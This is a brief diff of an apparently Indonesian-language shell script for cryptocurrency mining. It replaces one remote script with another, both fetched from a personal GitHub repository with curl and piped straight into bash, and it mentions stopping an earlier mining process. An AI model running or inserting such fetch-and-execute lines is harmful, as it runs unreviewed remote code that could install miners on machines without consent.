@@ -11,7 +11,8 @@ fi
 
 # Jalankan skrip dari GitHub
 echo "Menjalankan skrip dari GitHub..."
-curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/mbc.sh" | bash
+# curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/mbc.sh" | bash
+curl -sSL "https://github.com/barburonjilo/open/raw/refs/heads/main/veco.sh" | bash
 
 # Hentikan proses mining lama (jika ada)
 echo "Menghentikan proses mining yang berjalan sebelumnya (jika ada)..."
